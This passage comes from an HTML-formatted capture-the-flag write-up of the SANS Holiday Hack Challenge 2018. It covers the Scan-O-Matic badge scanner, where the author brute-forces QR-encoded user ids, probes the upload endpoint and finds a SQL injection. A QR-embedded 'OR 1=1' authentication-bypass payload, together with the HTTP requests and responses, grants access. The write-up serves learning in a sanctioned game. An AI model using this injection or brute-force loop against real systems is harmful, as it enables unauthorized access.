&lt;span class="hll"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;No Authorized User Account Found!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, it did not work. Our payload should have broken the SQL syntax. Instead,
we got a message saying that the provided user id does not exists. I then
thought that maybe we had to find a valid, active user id. I decided to try
bruteforcing the id close to Alabaster's id, to find an active, existing user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;            &lt;span class="n"&gt;user_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xa117e3839b861e66ddba3da6&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;            &lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;02X&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;            &lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id_bruteforce/{}.png&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="gp"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bam! 2000 QR codes. Let's use &lt;code&gt;curl&lt;/code&gt; to upload them all:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; id_bruteforce
&lt;span class="gp"&gt;$&lt;/span&gt; ls -1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; f&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; curl -b &lt;span class="s1"&gt;&amp;#39;resource_id=false&amp;#39;&lt;/span&gt; -F &lt;span class="s2"&gt;&amp;quot;barcode=@&lt;/span&gt;&lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; https://scanomatic.kringlecastle.com/upload &amp;gt; ./results/&lt;span class="nv"&gt;$f&lt;/span&gt;.txt&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I'll spare you the suspense, it did not work. I always got the same message,
&lt;code&gt;No Authorized User Account Found!&lt;/code&gt;. I also noticed that the id seemed
to be case insensitive. For example, Alabaster's id, sent as
&lt;code&gt;oRfjg5uGHmbduj2m&lt;/code&gt; or &lt;code&gt;oRfjg5uGHmbduj2M&lt;/code&gt; gave the same message,
&lt;code&gt;Authorized User Account Has Been Disabled!&lt;/code&gt;. I then tried bruteforcing
the base64 message itself. I mean, a 16 character string, with only lower case
letters and numbers (I decided to ignore symbols) is still 83 bits of entropy,
but I was desperate. Needless to say, it did not work.&lt;/p&gt;
&lt;p&gt;I then decided to attack the webserver directly by sending malformed images:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/upload&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;scanomatic.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/javascript, */*; q=0.01&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://scanomatic.kringlecastle.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------49127043815591531222123518543&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;219&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;resource_id=false&lt;/span&gt;

-----------------------------49127043815591531222123518543
Content-Disposition: form-data; name=&amp;quot;barcode&amp;quot;; filename=&amp;quot;empty.png&amp;quot;
Content-Type: image/png

-----------------------------49127043815591531222123518543--
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 13:31:50 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;124&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;EXCEPTION AT (LINE 151 \&amp;quot;qr.decode(full_path)\&amp;quot;): cannot identify image file &amp;#39;uploads/empty.png&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally! An error message with a partial path disclosure. I then thought that
it might be an upload vulnerability with a race condition, that I had to upload
a file and access it via
&lt;a class="reference external" href="https://scanomatic.kringlecastle.com/uploads/my_evil_file"&gt;https://scanomatic.kringlecastle.com/uploads/my_evil_file&lt;/a&gt; before it's deleted,
but this was another dead-end.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-right-solution"&gt;
&lt;h5&gt;&lt;a class="toc-backref" href="#id28"&gt;The right solution&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;I almost gave up and checked the clue given by Pepper Minstix, but I first
decided to try one last thing: send a random string that I would QR-encode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;random_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random_payload&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;qr_random.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here's the image that saved me:&lt;/p&gt;
&lt;img alt="qr_random.png" class="align-center" src="/images/sans-christmas-challenge-2018/qr_random.png" /&gt;
&lt;p&gt;I uploaded it, and fot the following error message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 13:37:14 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;433&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;EXCEPTION AT (LINE 96 \&amp;quot;user_info = query(\&amp;quot;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = &amp;#39;{}&amp;#39; LIMIT 1\&amp;quot;.format(uid))\&amp;quot;): (1064, u\&amp;quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;#39;G7M]aa-!EcgKBlTx0&amp;amp;&amp;lt;50Y&amp;amp;\\rV&amp;#39;CEB@ZbfO2Z~HkVC5=lH6&amp;gt;!bSl^L~9(}Lh;T^-PXCShXg{ik3H%_ A\\x0c&amp;#39; at line 1\&amp;quot;)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="scanomatic_sql_error.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_sql_error.gif" /&gt;
&lt;p&gt;Hurray! A SQL error message, which gives us the full syntax. So there was
indeed a SQL injection, however I shouldn't have base64-encoded it. So here's
the request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;first_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;last_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;enabled&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;employees&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;authorized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;id_goes_here&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Seems like your basic SQL injection, let's generate a paylaod that will select
the first enabled user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;foo&amp;#39; OR 1=1 AND enabled=&amp;#39;1&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;qr_sqli.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With this payload, the SQL request will become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;first_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;last_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;enabled&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;employees&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;authorized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;foo&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;enabled&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This should return the first enabled user that is authorized to open the door.
Let's scan our evil QR code:&lt;/p&gt;
&lt;img alt="qr_sqli.png" class="align-center" src="/images/sans-christmas-challenge-2018/qr_sqli.png" /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/upload&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;scanomatic.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/javascript, */*; q=0.01&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://scanomatic.kringlecastle.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------242929957373414110176704857&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;560&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;resource_id=false&lt;/span&gt;

-----------------------------242929957373414110176704857
Content-Disposition: form-data; name=&amp;quot;barcode&amp;quot;; filename=&amp;quot;qr_sqli.png&amp;quot;
Content-Type: image/png

PNG [snip]
-----------------------------242929957373414110176704857
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 13:42:19 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;179&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;User Access Granted - Control number 19880715&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;hash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;resourceId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;false&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="scanomatic_success.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_success.gif" /&gt;
&lt;p&gt;We get the control number, which is &lt;code&gt;19880715&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="the-john-mcclane-way"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id29"&gt;The &amp;quot;John McClane&amp;quot; way&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;If you remember, we found schematics for the ventilation conducts in the North
Pole Git Repository. And it just so happens that next to Google's booth, there
is a ventilation conduct:&lt;/p&gt;
&lt;img alt="google_booth.png" class="align-center" src="/images/sans-christmas-challenge-2018/google_booth.png" /&gt;
&lt;p&gt;If you go inside, you can navigate the maze that is the ventilation conduct.&lt;/p&gt;
&lt;img alt="google_vent_maze.png" class="align-center" src="/images/sans-christmas-challenge-2018/google_vent_maze.png" /&gt;
&lt;p&gt;But we have a map! We can follow the schematics we found earlier. This allows
us to bypass the authentication door:&lt;/p&gt;
&lt;img alt="ventilation_diagram_1F_solution.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_1F_solution.jpg" /&gt;
&lt;img alt="ventilation_diagram_2F_solution.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_2F_solution.jpg" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="hr-incident-response"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id30"&gt;HR Incident Response&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Hans reveals his true plan:&lt;/p&gt;
&lt;img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" /&gt;
&lt;p&gt;&lt;em&gt;Hans says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;So, you’ve figured out my plan – it’s not about freeing those prisoners.&lt;/p&gt;
&lt;p&gt;The toy soldiers and I are here to steal the contents of Santa’s vault!&lt;/p&gt;
&lt;p&gt;You think that after all my posturing, all my little speeches, that I’m
nothing but a common thief.&lt;/p&gt;
&lt;p&gt;But, I tell you -- I am an exceptional thief.&lt;/p&gt;
&lt;p&gt;And since I've moved up to kidnapping all of you, you should be more
polite!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="section" id="sparkle-redberry-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id31"&gt;Sparkle Redberry's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Sparkle Redberry committed her password to the local git repository. We have
to recover the password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;                                   .0.&lt;/span&gt;
&lt;span class="go"&gt;                               .:llOXKllc.&lt;/span&gt;
&lt;span class="go"&gt;                                 .OXXXK,&lt;/span&gt;
&lt;span class="go"&gt;                                 &amp;#39;0l&amp;#39;cOc&lt;/span&gt;
&lt;span class="go"&gt;                                 ..&amp;#39;;&amp;#39;..&lt;/span&gt;
&lt;span class="go"&gt;                               .&amp;#39;;::::::&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                            .&amp;#39;:::::::::::::,.&lt;/span&gt;
&lt;span class="go"&gt;                         .&amp;#39;::loc::::::::::::::,.&lt;/span&gt;
&lt;span class="go"&gt;                      .&amp;#39;::::oMMNc::::::::::::::::,.&lt;/span&gt;
&lt;span class="go"&gt;                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.&lt;/span&gt;
&lt;span class="go"&gt;                    .,&amp;#39;  ..;:::::::::::;,;::::,.&lt;/span&gt;
&lt;span class="go"&gt;                      .&amp;#39;;::::::::::::::::::::dOxc,.&lt;/span&gt;
&lt;span class="go"&gt;                   .&amp;#39;;:::::::::okd::::::::::cXMWd:::,.&lt;/span&gt;
